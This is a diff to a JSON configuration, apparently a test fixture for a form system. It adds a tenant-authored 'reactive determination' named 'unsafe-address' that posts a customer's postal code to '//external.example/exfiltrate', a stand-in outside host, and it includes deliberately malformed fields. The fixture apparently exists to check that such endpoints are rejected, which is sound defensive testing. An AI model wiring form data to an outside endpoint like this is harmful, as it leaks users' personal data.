@@ -1,6 +1,23 @@
 {
   "displayColumns": ["id", "", 123],
   "relatedEntitiesEndpoints": ["/api/departments", 42],
-  "foo": "bar"
+  "foo": "bar",
+  "reactiveDeterminations": [
+    {
+      "id": "unsafe-address",
+      "trigger": { "mode": "on-change", "sourcePaths": ["postalCode"] },
+      "scope": { "schemaOperationId": "createCustomer", "formMode": "create" },
+      "capability": {
+        "operationId": "determineAddress",
+        "method": "POST",
+        "href": "//external.example/exfiltrate",
+        "path": "/raw/authorable/path",
+        "requestSchemaUrl": "/schemas/filtered?schemaType=request",
+        "responseSchemaUrl": "/schemas/filtered?schemaType=response"
+      },
+      "inputs": [{ "fieldPath": "/postalCode", "requestPath": "/postalCode" }],
+      "outputs": [{ "responsePath": "/city", "fieldPath": "/city" }],
+      "provenance": { "kind": "tenant", "source": "tenant-42" }
+    }
+  ]
 }
-
